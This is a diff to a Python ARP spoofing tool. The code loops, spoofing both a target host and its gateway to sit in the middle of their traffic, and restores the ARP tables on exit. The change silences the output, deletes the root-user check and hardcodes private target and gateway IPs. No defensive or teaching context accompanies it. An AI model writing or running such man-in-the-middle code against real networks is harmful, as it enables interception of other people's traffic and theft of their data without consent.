@@ -48,11 +48,11 @@ class ARP:
                 self.spoof(target_ip, gateway_ip)
                 self.spoof(gateway_ip, target_ip)
                 sent_packets_count = sent_packets_count + 2
-                print("\r[+] Packets sent: " + str(sent_packets_count), )
+                # print("\r[+] Packets sent: " + str(sent_packets_count), )
                 sys.stdout.flush()
                 time.sleep(2)
         except KeyboardInterrupt:
-            print("\n[+] Detected CTRL+C ...... Quitting")
+            # print("\n[+] Detected CTRL+C ...... Quitting")
             self.restore(target_ip, gateway_ip)
             self.restore(gateway_ip, target_ip)
             proxy_off()
@@ -60,9 +60,9 @@ class ARP:
 
 if __name__ == '__main__':
     setting_read()
-    user_id = queue_set()
-    if user_id:
-        raise NotRootUserError("You are not in root user\nPlease go to root and boot program again")
-    else:
-        arp = ARP()
-        arp.to_arp(str(setting_res.get('server_ip')), str(setting_res.get('gateway_ip')))
+    
+
+    arp = ARP()
+    # arp.to_arp(str(setting_res.get('server_ip')), str(setting_res.get('gateway_ip')))
+    arp.to_arp("192.168.0.106", "192.168.0.101")
+
